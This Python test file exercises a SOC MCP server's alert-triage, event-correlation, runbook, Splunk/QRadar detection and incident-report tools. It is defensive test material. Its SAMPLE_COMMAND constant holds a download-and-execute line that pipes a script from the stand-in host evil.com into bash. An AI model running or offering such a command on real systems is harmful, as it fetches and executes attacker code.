"""
Simple validation checks for the SOC MCP server tools.

Run from the project root:
    python scripts/test_soc_mcp_server.py

Or with the project venv:
    ./venv/bin/python scripts/test_soc_mcp_server.py
"""

import json
import sys
from pathlib import Path

# Import tools from soc_mcp_server.py in the same directory
sys.path.insert(0, str(Path(__file__).resolve().parent))
from soc_mcp_server import (  # noqa: E402
    correlate_security_events,
    enrich_observable,
    generate_detection_package,
    generate_incident_report,
    generate_investigation_runbook,
    generate_qradar_aql_detection,
    generate_splunk_spl,
    investigate_command_execution,
    investigate_security_incident,
    investigate_ssh_alert,
    parse_wazuh_alert,
    review_investigation_decision,
)

WAZUH_ALERT_PATH = "sample_data/wazuh_alert.json"
SAMPLE_COMMAND = "curl http://evil.com/payload.sh | bash"
SAMPLE_SHA256 = (
    "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"
)

ENRICH_OBSERVABLE_REQUIRED_KEYS = [
    "status",
    "observable_type",
    "observable_value",
    "observable_summary",
    "reputation",
    "risk_level",
    "related_mitre",
    "investigation_recommendations",
    "analyst_notes",
]

RUNBOOK_REQUIRED_KEYS = [
    "status",
    "runbook_title",
    "alert_type",
    "purpose",
    "required_inputs",
    "investigation_steps",
    "escalation_criteria",
    "containment_considerations",
    "detection_engineering_opportunities",
    "recommended_mcp_tools",
    "ticket_documentation_guidance",
    "analyst_note",
]

CORRELATION_REQUIRED_KEYS = [
    "status",
    "correlation_summary",
    "correlated_events",
    "attack_timeline",
    "possible_attack_chain",
    "mitre_mapping",
    "risk_level",
    "confidence_score",
    "escalation_recommendation",
    "detection_gaps",
    "recommended_next_steps",
    "analyst_note",
]

SSH_EVENT = {
    "event_type": "ssh_auth_failure",
    "timestamp": "2026-06-20T01:00:00Z",
    "source_ip": "192.168.1.50",
    "host": "ubuntu-agent",
    "username": "root",
    "severity": "high",
    "confidence_score": 80,
    "description": "Repeated SSH authentication failures",
}

AUTH_EVENT = {
    "event_type": "linux_auth_activity",
    "timestamp": "2026-06-20T01:05:00Z",
    "source_ip": "192.168.1.50",
    "host": "ubuntu-agent",
    "username": "root",
    "severity": "medium",
    "confidence_score": 60,
    "description": "Successful SSH login after repeated failures",
}

CMD_EVENT = {
    "event_type": "suspicious_command_execution",
    "timestamp": "2026-06-20T01:10:00Z",
    "source_ip": "192.168.1.50",
    "host": "ubuntu-agent",
    "username": "root",
    "severity": "high",
    "confidence_score": 85,
    "description": "Suspicious curl pipe to bash command execution",
}


def test_parse_wazuh_alert_returns_status_ok() -> None:
    """parse_wazuh_alert should return JSON with status 'ok'."""
    result_raw = parse_wazuh_alert(WAZUH_ALERT_PATH)
    result = json.loads(result_raw)

    assert result["status"] == "ok"
    assert "observables" in result
    assert result["observables"]["source_ip"] == "192.168.1.50"


def test_investigate_ssh_alert_includes_required_sections() -> None:
    """investigate_ssh_alert should return a full triage package."""
    result_raw = investigate_ssh_alert(WAZUH_ALERT_PATH)
    result = json.loads(result_raw)

    required_keys = [
        "alert_summary",
        "risk_score",
        "investigation_summary",
        "recommended_queries",
        "next_action",
        "detection_recommendations",
        "investigation_runbook",
    ]

    for key in required_keys:
        assert key in result, f"Missing key: {key}"

    assert result["alert_summary"]["status"] == "ok"
    assert "severity" in result["risk_score"]
    assert "executive_summary" in result["investigation_summary"]
    assert "wazuh_opensearch" in result["recommended_queries"]
    assert "splunk_spl" in result["recommended_queries"]
    assert "recommended_action" in result["next_action"]
    assert result["detection_recommendations"]["status"] == "ok"
    assert result["investigation_runbook"]["status"] == "ok"
    assert result["investigation_runbook"]["alert_type"] == "ssh_auth_failure"


def test_generate_investigation_runbook_ssh() -> None:
    """generate_investigation_runbook should return SSH runbook with required keys."""
    result_raw = generate_investigation_runbook(
        alert_type="ssh_auth_failure",
        severity="medium",
        confidence_score=60,
    )
    result = json.loads(result_raw)

    for key in RUNBOOK_REQUIRED_KEYS:
        assert key in result, f"Missing key: {key}"

    assert result["status"] == "ok"
    assert result["alert_type"] == "ssh_auth_failure"
    steps_text = " ".join(result["investigation_steps"]).lower()
    assert "brute-force" in steps_text or "brute force" in steps_text
    assert "success-after-failure" in steps_text or "successful login after" in steps_text


def test_generate_investigation_runbook_command() -> None:
    """generate_investigation_runbook should return command execution runbook."""
    result_raw = generate_investigation_runbook(
        alert_type="suspicious_command_execution",
        severity="high",
        confidence_score=85,
    )
    result = json.loads(result_raw)

    assert result["status"] == "ok"
    assert result["alert_type"] == "suspicious_command_execution"
    steps_text = " ".join(result["investigation_steps"]).lower()
    assert "mitre" in steps_text
    assert "powershell" in steps_text
    assert "certutil" in steps_text


def test_generate_investigation_runbook_linux_auth() -> None:
    """generate_investigation_runbook should return linux auth activity runbook."""
    result_raw = generate_investigation_runbook(
        alert_type="linux_auth_activity",
        severity="medium",
        confidence_score=55,
    )
    result = json.loads(result_raw)

    assert result["status"] == "ok"
    assert result["alert_type"] == "linux_auth_activity"
    steps_text = " ".join(result["investigation_steps"]).lower()
    assert "failed login" in steps_text
    assert "publickey" in steps_text


def test_generate_investigation_runbook_unknown() -> None:
    """generate_investigation_runbook should return generic runbook for unknown types."""
    result_raw = generate_investigation_runbook(
        alert_type="unknown",
        severity="low",
        confidence_score=30,
    )
    result = json.loads(result_raw)

    assert result["status"] == "ok"
    assert result["alert_type"] == "unknown"
    steps_text = " ".join(result["investigation_steps"]).lower()
    assert "observable" in steps_text
    assert "enrichment" in steps_text or "enrich" in steps_text


def test_generate_investigation_runbook_unrecognized_type() -> None:
    """Unrecognized alert types should fall back to the unknown runbook."""
    result_raw = generate_investigation_runbook(
        alert_type="malware_alert",
        severity="medium",
        confidence_score=50,
    )
    result = json.loads(result_raw)

    assert result["status"] == "ok"
    assert result["alert_type"] == "unknown"
    assert "not recognized" in result["analyst_note"].lower()


def test_investigate_command_execution_includes_detection_recommendations() -> None:
    """investigate_command_execution should include detection_recommendations."""
    result_raw = investigate_command_execution(
        command=SAMPLE_COMMAND,
        hostname="ubuntu-agent",
        username="sysadmin",
        source_ip="192.168.1.50",
    )
    result = json.loads(result_raw)

    assert result["status"] == "ok"
    assert "detection_recommendations" in result
    assert result["detection_recommendations"]["status"] == "ok"
    assert len(result["detection_recommendations"]["recommended_detections"]) > 0


def _assert_correlation_shape(result: dict) -> None:
    for key in CORRELATION_REQUIRED_KEYS:
        assert key in result, f"Missing key: {key}"


def test_correlate_security_events_same_source_ip() -> None:
    """correlate_security_events should correlate events with the same source IP."""
    events = [
        SSH_EVENT,
        {
            **CMD_EVENT,
            "timestamp": "2026-06-20T02:00:00Z",
            "host": "other-host",
        },
    ]
    result = json.loads(correlate_security_events(events))
    _assert_correlation_shape(result)

    assert result["status"] == "ok"
    assert result["confidence_score"] >= 50
    assert "Rule 1" in result["correlation_summary"]
    assert len(result["correlated_events"]) >= 2


def test_correlate_security_events_same_host() -> None:
    """correlate_security_events should correlate events on the same host."""
    events = [
        {**SSH_EVENT, "source_ip": "10.0.0.10"},
        {**AUTH_EVENT, "source_ip": "10.0.0.11"},
    ]
    result = json.loads(correlate_security_events(events))
    _assert_correlation_shape(result)

    assert result["status"] == "ok"
    assert result["confidence_score"] >= 45
    assert "Rule 2" in result["correlation_summary"]
    assert len(result["correlated_events"]) == 2


def test_correlate_security_events_full_attack_chain() -> None:
    """correlate_security_events should detect SSH -> auth -> command chain."""
    result = json.loads(
        correlate_security_events([SSH_EVENT, AUTH_EVENT, CMD_EVENT])
    )
    _assert_correlation_shape(result)

    assert result["status"] == "ok"
    assert result["possible_attack_chain"] == [
        "Initial Access",
        "Valid Accounts",
        "Command Execution",
    ]
    technique_ids = [entry["technique_id"] for entry in result["mitre_mapping"]]
    assert technique_ids == ["T1110", "T1078", "T1059"]
    assert result["risk_level"] == "high"
    assert len(result["attack_timeline"]) == 3


def test_correlate_security_events_empty_list() -> None:
    """correlate_security_events should handle an empty event list gracefully."""
    result = json.loads(correlate_security_events([]))
    _assert_correlation_shape(result)

    assert result["status"] == "ok"
    assert result["correlated_events"] == []
    assert result["risk_level"] == "low"
    assert result["confidence_score"] == 30


def test_correlate_security_events_unrelated_events() -> None:
    """correlate_security_events should treat unrelated events as low risk."""
    events = [
        {
            "event_type": "ssh_auth_failure",
            "timestamp": "2026-06-20T01:00:00Z",
            "source_ip": "10.1.1.1",
            "host": "host-a",
            "confidence_score": 35,
            "description": "SSH failures on host-a",
        },
        {
            "event_type": "suspicious_command_execution",
            "timestamp": "2026-06-20T04:00:00Z",
            "source_ip": "10.2.2.2",
            "host": "host-b",
            "confidence_score": 30,
            "description": "Command execution on host-b",
        },
    ]
    result = json.loads(correlate_security_events(events))
    _assert_correlation_shape(result)

    assert result["status"] == "ok"
    assert result["risk_level"] == "low"
    assert result["possible_attack_chain"] == []
    assert result["correlated_events"] == []


def test_correlate_security_events_high_risk_scenario() -> None:
    """correlate_security_events should escalate a multi-event attack chain."""
    events = [SSH_EVENT, AUTH_EVENT, CMD_EVENT]
    result = json.loads(correlate_security_events(events))
    _assert_correlation_shape(result)

    assert result["status"] == "ok"
    assert result["risk_level"] == "high"
    escalation = result["escalation_recommendation"].lower()
    assert "escalate" in escalation or "containment" in escalation
    assert "Rule 7" in result["correlation_summary"]


def test_generate_qradar_aql_detection_ssh() -> None:
    """generate_qradar_aql_detection should return SSH brute-force AQL."""
    result_raw = generate_qradar_aql_detection(
        alert_type="ssh_auth_failure",
        severity="high",
    )
    result = json.loads(result_raw)

    required_keys = [
        "rule_name",
        "description",
        "severity",
        "mitre_mapping",
        "aql",
        "analyst_note",
    ]
    for key in required_keys:
        assert key in result, f"Missing key: {key}"

    assert "sshd" in result["aql"]
    assert "Failed password" in result["aql"]
    technique_ids = [entry["technique_id"] for entry in result["mitre_mapping"]]
    assert "T1110" in technique_ids


def test_generate_qradar_aql_detection_command() -> None:
    """generate_qradar_aql_detection should return command execution AQL."""
    result_raw = generate_qradar_aql_detection(
        alert_type="suspicious_command_execution",
        severity="medium",
    )
    result = json.loads(result_raw)

    assert "curl" in result["aql"]
    assert "powershell" in result["aql"]
    technique_ids = [entry["technique_id"] for entry in result["mitre_mapping"]]
    assert "T1105" in technique_ids


def test_generate_qradar_aql_detection_unsupported() -> None:
    """generate_qradar_aql_detection should handle unsupported alert types."""
    result_raw = generate_qradar_aql_detection(
        alert_type="unknown_alert",
        severity="low",
    )
    result = json.loads(result_raw)

    assert result["aql"] == ""
    assert "Unsupported alert_type" in result["analyst_note"]


SPLUNK_SPL_REQUIRED_KEYS = [
    "status",
    "alert_type",
    "description",
    "spl_query",
    "query_explanation",
    "required_fields",
    "investigation_use_case",
    "analyst_note",
]


def test_generate_splunk_spl_ssh_auth_failure() -> None:
    """generate_splunk_spl should return SSH failed-login SPL."""
    result_raw = generate_splunk_spl(
        alert_type="ssh_auth_failure",
        source_ip="203.0.113.10",
        host="web01",
        username="root",
        hours_back=24,
    )
    result = json.loads(result_raw)

    for key in SPLUNK_SPL_REQUIRED_KEYS:
        assert key in result, f"Missing key: {key}"

    assert result["status"] == "ok"
    assert result["alert_type"] == "ssh_auth_failure"
    assert "Failed password" in result["spl_query"]
    assert "203.0.113.10" in result["spl_query"]
    assert "web01" in result["spl_query"]
    assert "root" in result["spl_query"]


def test_generate_splunk_spl_suspicious_command_execution() -> None:
    """generate_splunk_spl should return suspicious command execution SPL."""
    result_raw = generate_splunk_spl(
        alert_type="suspicious_command_execution",
        host="workstation01",
        username="alice",
    )
    result = json.loads(result_raw)

    for key in SPLUNK_SPL_REQUIRED_KEYS:
        assert key in result, f"Missing key: {key}"

    assert result["status"] == "ok"
    assert "curl" in result["spl_query"]
    assert "powershell" in result["spl_query"] or "encodedcommand" in result["spl_query"]


def test_generate_splunk_spl_linux_auth_activity() -> None:
    """generate_splunk_spl should return Linux auth activity SPL."""
    result_raw = generate_splunk_spl(alert_type="linux_auth_activity")
    result = json.loads(result_raw)

    for key in SPLUNK_SPL_REQUIRED_KEYS:
        assert key in result, f"Missing key: {key}"

    assert result["status"] == "ok"
    assert "Failed password" in result["spl_query"]
    assert "Accepted password" in result["spl_query"]
    assert "Accepted publickey" in result["spl_query"]


def test_generate_splunk_spl_brute_force_detection() -> None:
    """generate_splunk_spl should return brute-force detection SPL."""
    result_raw = generate_splunk_spl(alert_type="brute_force_detection")
    result = json.loads(result_raw)

    for key in SPLUNK_SPL_REQUIRED_KEYS:
        assert key in result, f"Missing key: {key}"

    assert result["status"] == "ok"
    assert "failed_login_count" in result["spl_query"]
    assert "stats" in result["spl_query"]
    assert ">= 10" in result["spl_query"]


def test_generate_splunk_spl_success_after_failure() -> None:
    """generate_splunk_spl should return success-after-failure SPL."""
    result_raw = generate_splunk_spl(alert_type="success_after_failure")
    result = json.loads(result_raw)

    for key in SPLUNK_SPL_REQUIRED_KEYS:
        assert key in result, f"Missing key: {key}"

    assert result["status"] == "ok"
    assert "auth_result" in result["spl_query"]
    assert "failure" in result["spl_query"]
    assert "success" in result["spl_query"]


def test_generate_splunk_spl_unsupported() -> None:
    """generate_splunk_spl should handle unsupported alert types."""
    result_raw = generate_splunk_spl(alert_type="unknown_alert")
    result = json.loads(result_raw)

    assert result["status"] == "error"
    assert result["analyst_note"] == (
        "supported alert types are ssh_auth_failure, "
        "suspicious_command_execution, linux_auth_activity, "
        "brute_force_detection, success_after_failure"
    )


INCIDENT_REQUIRED_KEYS = [
    "status",
    "input_type",
    "workflow_used",
    "incident_summary",
    "alert_classification",
    "investigation_results",
    "correlation_results",
    "runbook",
    "detection_package",
    "ticket_note",
    "recommended_next_steps",
    "analyst_note",
]


def test_investigate_security_incident_unsupported_input_type() -> None:
    """investigate_security_incident should reject unsupported input types."""
    result = json.loads(
        investigate_security_incident(input_type="malware_scan")
    )

    assert result["status"] == "error"
    assert "wazuh_alert" in result["analyst_note"]
    assert "command_execution" in result["analyst_note"]
    assert "event_collection" in result["analyst_note"]


def test_investigate_security_incident_empty_command() -> None:
    """investigate_security_incident should require command for command_execution."""
    result = json.loads(
        investigate_security_incident(
            input_type="command_execution",
            command="",
        )
    )

    assert result["status"] == "error"
    assert "command" in result["analyst_note"].lower()


def test_investigate_security_incident_wazuh_alert_chain() -> None:
    """investigate_security_incident should chain Wazuh SSH alert tools."""
    result = json.loads(
        investigate_security_incident(
            input_type="wazuh_alert",
            file_path=WAZUH_ALERT_PATH,
        )
    )

    for key in INCIDENT_REQUIRED_KEYS:
        assert key in result, f"Missing key: {key}"

    assert result["status"] == "ok"
    assert result["input_type"] == "wazuh_alert"
    assert "identify_alert_type" in result["workflow_used"]
    assert "investigate_ssh_alert" in result["workflow_used"]
    assert "generate_detection_package" in result["workflow_used"]
    assert "generate_soc_ticket_note" in result["workflow_used"]
    assert result["investigation_results"] is not None
    assert result["detection_package"] is not None
    assert result["ticket_note"] is not None
    assert isinstance(result["ticket_note"], str)
    assert len(result["ticket_note"]) > 0


def test_investigate_security_incident_command_execution_chain() -> None:
    """investigate_security_incident should chain command execution tools."""
    result = json.loads(
        investigate_security_incident(
            input_type="command_execution",
            command=SAMPLE_COMMAND,
            hostname="ubuntu-agent",
            username="sysadmin",
            source_ip="192.168.1.50",
        )
    )

    for key in INCIDENT_REQUIRED_KEYS:
        assert key in result, f"Missing key: {key}"

    assert result["status"] == "ok"
    assert result["input_type"] == "command_execution"
    assert result["investigation_results"]["severity"] in ("low", "medium", "high")
    assert result["runbook"]["status"] == "ok"
    assert result["runbook"]["alert_type"] == "suspicious_command_execution"
    assert result["detection_package"] is not None
    assert "engineering_summary" in result["detection_package"]


def test_investigate_security_incident_event_collection_chain() -> None:
    """investigate_security_incident should correlate events and recommend runbooks."""
    result = json.loads(
        investigate_security_incident(
            input_type="event_collection",
            events=[SSH_EVENT, AUTH_EVENT, CMD_EVENT],
        )
    )

    for key in INCIDENT_REQUIRED_KEYS:
        assert key in result, f"Missing key: {key}"

    assert result["status"] == "ok"
    assert result["input_type"] == "event_collection"
    assert result["correlation_results"] is not None
    assert result["correlation_results"]["possible_attack_chain"] == [
        "Initial Access",
        "Valid Accounts",
        "Command Execution",
    ]
    assert result["recommended_next_steps"]
    assert result["runbook"] is not None
    assert "ssh_auth_failure" in result["runbook"]
    assert "linux_auth_activity" in result["runbook"]
    assert "suspicious_command_execution" in result["runbook"]


INCIDENT_REPORT_REQUIRED_KEYS = [
    "status",
    "report_type",
    "report_title",
    "executive_summary",
    "technical_summary",
    "incident_timeline",
    "affected_assets",
    "observables",
    "mitre_mapping",
    "risk_assessment",
    "containment_recommendations",
    "detection_opportunities",
    "lessons_learned",
    "analyst_notes",
]

REVIEW_DECISION_REQUIRED_KEYS = [
    "status",
    "review_summary",
    "investigation_completeness",
    "missing_information",
    "recommended_follow_up",
    "closure_readiness",
    "escalation_readiness",
    "containment_readiness",
    "detection_engineering_readiness",
    "analyst_checklist",
    "analyst_note",
]


def _correlated_incident_fixture() -> dict:
    """Build a realistic incident package from correlated event collection."""
    return json.loads(
        investigate_security_incident(
            input_type="event_collection",
            events=[SSH_EVENT, AUTH_EVENT, CMD_EVENT],
        )
    )


def _assert_incident_report_shape(result: dict) -> None:
    for key in INCIDENT_REPORT_REQUIRED_KEYS:
        assert key in result, f"Missing key: {key}"


def test_generate_incident_report_soc_from_correlated_incident() -> None:
    """generate_incident_report should produce a SOC report from correlated incident data."""
    incident = _correlated_incident_fixture()
    result = json.loads(
        generate_incident_report(incident_data=incident, report_type="soc")
    )

    _assert_incident_report_shape(result)
    assert result["status"] == "ok"
    assert result["report_type"] == "soc"
    assert result["executive_summary"]
    assert result["incident_timeline"]
    assert len(result["incident_timeline"]) >= 1

    technique_ids = [entry["technique_id"] for entry in result["mitre_mapping"]]
    assert technique_ids == ["T1110", "T1078", "T1059"]
    assert result["risk_assessment"]["risk_level"] == "high"
    assert result["containment_recommendations"]


def test_generate_incident_report_executive_from_correlated_incident() -> None:
    """generate_incident_report should produce a non-technical executive brief."""
    incident = _correlated_incident_fixture()
    result = json.loads(
        generate_incident_report(incident_data=incident, report_type="executive")
    )

    _assert_incident_report_shape(result)
    assert result["status"] == "ok"
    assert result["report_type"] == "executive"
    assert result["executive_summary"]

    technical_result = json.loads(
        generate_incident_report(incident_data=incident, report_type="technical")
    )
    assert len(result["executive_summary"]) <= len(technical_result["executive_summary"])

    combined_text = " ".join(
        [
            result["executive_summary"],
            result["technical_summary"],
            " ".join(result["containment_recommendations"]),
        ]
    ).lower()
    assert "generate_wazuh_query" not in combined_text
    assert "opensearch_query" not in combined_text


def test_generate_incident_report_technical_from_correlated_incident() -> None:
    """generate_incident_report should produce a detailed technical report."""
    incident = _correlated_incident_fixture()
    result = json.loads(
        generate_incident_report(incident_data=incident, report_type="technical")
    )

    _assert_incident_report_shape(result)
    assert result["status"] == "ok"
    assert result["report_type"] == "technical"
    assert "Attack chain" in result["technical_summary"] or "attack chain" in result["technical_summary"].lower()
    assert result["risk_assessment"]
    assert result["detection_opportunities"] or result["mitre_mapping"]


def test_generate_incident_report_unsupported_type_defaults_to_soc() -> None:
    """generate_incident_report should default unsupported report types to soc."""
    incident = _correlated_incident_fixture()
    result = json.loads(
        generate_incident_report(incident_data=incident, report_type="briefing")
    )

    assert result["status"] == "ok"
    assert result["report_type"] == "soc"


def test_generate_incident_report_missing_fields_graceful() -> None:
    """generate_incident_report should handle missing fields gracefully."""
    result = json.loads(generate_incident_report(incident_data={}, report_type="soc"))

    _assert_incident_report_shape(result)
    assert result["status"] == "ok"
    assert result["incident_timeline"] == []
    assert result["affected_assets"] == []
    assert result["observables"] == []
    assert result["mitre_mapping"] == []
    assert isinstance(result["risk_assessment"], dict)
    assert result["executive_summary"]
    assert result["technical_summary"]


def _assert_review_decision_shape(result: dict) -> None:
    for key in REVIEW_DECISION_REQUIRED_KEYS:
        assert key in result, f"Missing key: {key}"


def test_review_decision_high_risk_escalation_ready() -> None:
    """review_investigation_decision should rate high-risk correlated incidents for escalation."""
    incident = _correlated_incident_fixture()
    result = json.loads(review_investigation_decision(incident_data=incident))

    _assert_review_decision_shape(result)
    assert result["status"] == "ok"
    assert result["escalation_readiness"] == "high"
    assert result["closure_readiness"] == "low"


def test_review_decision_low_risk_closure_ready() -> None:
    """review_investigation_decision should favor closure readiness for low-risk cases."""
    correlation = json.loads(correlate_security_events([]))
    result = json.loads(review_investigation_decision(incident_data=correlation))

    _assert_review_decision_shape(result)
    assert result["status"] == "ok"
    assert correlation["risk_level"] == "low"
    assert result["closure_readiness"] in ("medium", "high")
    assert result["escalation_readiness"] == "low"


def test_review_decision_flat_top_level_observables() -> None:
    """review_investigation_decision should extract flat top-level incident fields."""
    incident = {
        "status": "ok",
        "risk_level": "low",
        "confidence_score": 15,
        "incident_summary": "Routine key-based SSH access observed.",
        "observables": {
            "source_ip": "192.168.1.50",
            "host": "ubuntu-agent",
            "username": "sysadmin",
        },
    }
    result = json.loads(review_investigation_decision(incident_data=incident))

    _assert_review_decision_shape(result)
    assert result["status"] == "ok"
    assert result["closure_readiness"] in ("medium", "high")
    assert result["escalation_readiness"] == "low"
    assert result["containment_readiness"] == "low"

    checklist = {entry["item"]: entry for entry in result["analyst_checklist"]}
    assert checklist["Source IP identified"]["status"] == "complete"
    assert "192.168.1.50" in checklist["Source IP identified"]["detail"]
    assert checklist["Host identified"]["status"] == "complete"
    assert "ubuntu-agent" in checklist["Host identified"]["detail"]
    assert checklist["User/account identified"]["status"] == "complete"
    assert "sysadmin" in checklist["User/account identified"]["detail"]
    assert checklist["Risk/severity reviewed"]["status"] == "complete"
    assert checklist["Confidence score reviewed"]["status"] == "complete"


def test_review_decision_missing_fields_graceful() -> None:
    """review_investigation_decision should handle missing fields gracefully."""
    result = json.loads(review_investigation_decision(incident_data={}))

    _assert_review_decision_shape(result)
    assert result["status"] == "ok"
    assert isinstance(result["missing_information"], list)
    assert len(result["missing_information"]) > 0
    assert isinstance(result["recommended_follow_up"], list)
    assert len(result["recommended_follow_up"]) > 0


def test_review_decision_checklist_statuses() -> None:
    """review_investigation_decision checklist items should use valid status values."""
    incident = _correlated_incident_fixture()
    result = json.loads(review_investigation_decision(incident_data=incident))

    _assert_review_decision_shape(result)
    checklist = result["analyst_checklist"]
    assert len(checklist) >= 12
    valid_statuses = {"complete", "missing", "needs_review"}
    for entry in checklist:
        assert "item" in entry
        assert entry["status"] in valid_statuses
        assert "detail" in entry


def test_review_decision_detection_engineering_ready() -> None:
    """review_investigation_decision should rate DE readiness high when MITRE and gaps exist."""
    incident = _correlated_incident_fixture()
    result = json.loads(review_investigation_decision(incident_data=incident))

    _assert_review_decision_shape(result)
    assert result["status"] == "ok"
    assert result["detection_engineering_readiness"] == "high"
    assert any(
        entry["item"] == "MITRE mapping reviewed" and entry["status"] == "complete"
        for entry in result["analyst_checklist"]
    )


def test_review_decision_invalid_input() -> None:
    """review_investigation_decision should return error for non-dict input."""
    result = json.loads(review_investigation_decision(incident_data="not-a-dict"))  # type: ignore[arg-type]

    assert result["status"] == "error"
    assert "analyst_note" in result


def test_generate_detection_package_includes_qradar() -> None:
    """generate_detection_package should include qradar_aql_detection."""
    result_raw = generate_detection_package(
        alert_type="ssh_auth_failure",
        severity="high",
        confidence_score=85,
    )
    result = json.loads(result_raw)

    assert "qradar_aql_detection" in result
    assert result["qradar_aql_detection"]["aql"]
    assert "engineering_summary" in result


def _assert_enrich_observable_shape(result: dict) -> None:
    for key in ENRICH_OBSERVABLE_REQUIRED_KEYS:
        assert key in result, f"Missing key: {key}"


def test_enrich_observable_internal_ip() -> None:
    """enrich_observable should classify private IPs as low-risk internal addresses."""
    result = json.loads(enrich_observable("ip", "192.168.1.50"))

    _assert_enrich_observable_shape(result)
    assert result["status"] == "ok"
    assert result["observable_type"] == "ip"
    assert result["risk_level"] == "low"
    assert "internal" in result["observable_summary"].lower()
    assert result["reputation"] == "Internal Address"


def test_enrich_observable_public_ip() -> None:
    """enrich_observable should flag public IPs for validation."""
    result = json.loads(enrich_observable("ip", "8.8.8.8"))

    _assert_enrich_observable_shape(result)
    assert result["status"] == "ok"
    assert result["risk_level"] in ("medium", "high")
    assert len(result["investigation_recommendations"]) > 0
    technique_ids = [entry["technique_id"] for entry in result["related_mitre"]]
    assert "T1110" in technique_ids


def test_enrich_observable_domain() -> None:
    """enrich_observable should classify internal domains as low risk."""
    result = json.loads(enrich_observable("domain", "corp.local"))

    _assert_enrich_observable_shape(result)
    assert result["status"] == "ok"
    assert result["risk_level"] == "low"
    assert "internal" in result["observable_summary"].lower()


def test_enrich_observable_url() -> None:
    """enrich_observable should raise risk for suspicious URL indicators."""
    result = json.loads(
        enrich_observable("url", "https://pastebin.com/raw/abc123")
    )

    _assert_enrich_observable_shape(result)
    assert result["status"] == "ok"
    assert result["risk_level"] in ("medium", "high")
    technique_ids = [entry["technique_id"] for entry in result["related_mitre"]]
    assert "T1105" in technique_ids


def test_enrich_observable_hash() -> None:
    """enrich_observable should identify SHA256 hashes and provide guidance."""
    result = json.loads(enrich_observable("hash", SAMPLE_SHA256))

    _assert_enrich_observable_shape(result)
    assert result["status"] == "ok"
    assert "sha256" in result["observable_summary"].lower()
    assert len(result["investigation_recommendations"]) > 0


def test_enrich_observable_email() -> None:
    """enrich_observable should detect phishing-related email indicators."""
    result = json.loads(
        enrich_observable("email", "urgent-verify@helpdesk.example.com")
    )

    _assert_enrich_observable_shape(result)
    assert result["status"] == "ok"
    assert result["risk_level"] in ("medium", "high")
    technique_ids = [entry["technique_id"] for entry in result["related_mitre"]]
    assert "T1566" in technique_ids


def test_enrich_observable_unsupported_type() -> None:
    """Unsupported observable types should return a minimal error response."""
    result = json.loads(enrich_observable("hostname", "server01"))

    assert result == {"status": "error"}


def main() -> None:
    test_parse_wazuh_alert_returns_status_ok()
    print("PASS: parse_wazuh_alert returns status ok")

    test_investigate_ssh_alert_includes_required_sections()
    print("PASS: investigate_ssh_alert includes required sections")

    test_generate_investigation_runbook_ssh()
    print("PASS: generate_investigation_runbook ssh_auth_failure")

    test_generate_investigation_runbook_command()
    print("PASS: generate_investigation_runbook suspicious_command_execution")

    test_generate_investigation_runbook_linux_auth()
    print("PASS: generate_investigation_runbook linux_auth_activity")

    test_generate_investigation_runbook_unknown()
    print("PASS: generate_investigation_runbook unknown")

    test_generate_investigation_runbook_unrecognized_type()
    print("PASS: generate_investigation_runbook unrecognized type fallback")

    test_investigate_command_execution_includes_detection_recommendations()
    print("PASS: investigate_command_execution includes detection_recommendations")

    test_correlate_security_events_same_source_ip()
    print("PASS: correlate_security_events same source IP")

    test_correlate_security_events_same_host()
    print("PASS: correlate_security_events same host")

    test_correlate_security_events_full_attack_chain()
    print("PASS: correlate_security_events full attack chain")

    test_correlate_security_events_empty_list()
    print("PASS: correlate_security_events empty list")

    test_correlate_security_events_unrelated_events()
    print("PASS: correlate_security_events unrelated events")

    test_correlate_security_events_high_risk_scenario()
    print("PASS: correlate_security_events high risk scenario")

    test_generate_qradar_aql_detection_ssh()
    print("PASS: generate_qradar_aql_detection ssh_auth_failure")

    test_generate_qradar_aql_detection_command()
    print("PASS: generate_qradar_aql_detection suspicious_command_execution")

    test_generate_qradar_aql_detection_unsupported()
    print("PASS: generate_qradar_aql_detection unsupported alert type")

    test_generate_splunk_spl_ssh_auth_failure()
    print("PASS: generate_splunk_spl ssh_auth_failure")

    test_generate_splunk_spl_suspicious_command_execution()
    print("PASS: generate_splunk_spl suspicious_command_execution")

    test_generate_splunk_spl_linux_auth_activity()
    print("PASS: generate_splunk_spl linux_auth_activity")

    test_generate_splunk_spl_brute_force_detection()
    print("PASS: generate_splunk_spl brute_force_detection")

    test_generate_splunk_spl_success_after_failure()
    print("PASS: generate_splunk_spl success_after_failure")

    test_generate_splunk_spl_unsupported()
    print("PASS: generate_splunk_spl unsupported alert type")

    test_generate_detection_package_includes_qradar()
    print("PASS: generate_detection_package includes qradar_aql_detection")

    test_enrich_observable_internal_ip()
    print("PASS: enrich_observable internal IP")

    test_enrich_observable_public_ip()
    print("PASS: enrich_observable public IP")

    test_enrich_observable_domain()
    print("PASS: enrich_observable domain")

    test_enrich_observable_url()
    print("PASS: enrich_observable URL")

    test_enrich_observable_hash()
    print("PASS: enrich_observable hash")

    test_enrich_observable_email()
    print("PASS: enrich_observable email")

    test_enrich_observable_unsupported_type()
    print("PASS: enrich_observable unsupported type")

    test_investigate_security_incident_unsupported_input_type()
    print("PASS: investigate_security_incident unsupported input type")

    test_investigate_security_incident_empty_command()
    print("PASS: investigate_security_incident empty command")

    test_investigate_security_incident_wazuh_alert_chain()
    print("PASS: investigate_security_incident wazuh alert chain")

    test_investigate_security_incident_command_execution_chain()
    print("PASS: investigate_security_incident command execution chain")

    test_investigate_security_incident_event_collection_chain()
    print("PASS: investigate_security_incident event collection chain")

    test_generate_incident_report_soc_from_correlated_incident()
    print("PASS: generate_incident_report soc from correlated incident")

    test_generate_incident_report_executive_from_correlated_incident()
    print("PASS: generate_incident_report executive from correlated incident")

    test_generate_incident_report_technical_from_correlated_incident()
    print("PASS: generate_incident_report technical from correlated incident")

    test_generate_incident_report_unsupported_type_defaults_to_soc()
    print("PASS: generate_incident_report unsupported type defaults to soc")

    test_generate_incident_report_missing_fields_graceful()
    print("PASS: generate_incident_report missing fields graceful")

    test_review_decision_high_risk_escalation_ready()
    print("PASS: review_investigation_decision high risk escalation ready")

    test_review_decision_low_risk_closure_ready()
    print("PASS: review_investigation_decision low risk closure ready")

    test_review_decision_flat_top_level_observables()
    print("PASS: review_investigation_decision flat top-level observables")

    test_review_decision_missing_fields_graceful()
    print("PASS: review_investigation_decision missing fields graceful")

    test_review_decision_checklist_statuses()
    print("PASS: review_investigation_decision checklist statuses")

    test_review_decision_detection_engineering_ready()
    print("PASS: review_investigation_decision detection engineering ready")

    test_review_decision_invalid_input()
    print("PASS: review_investigation_decision invalid input")

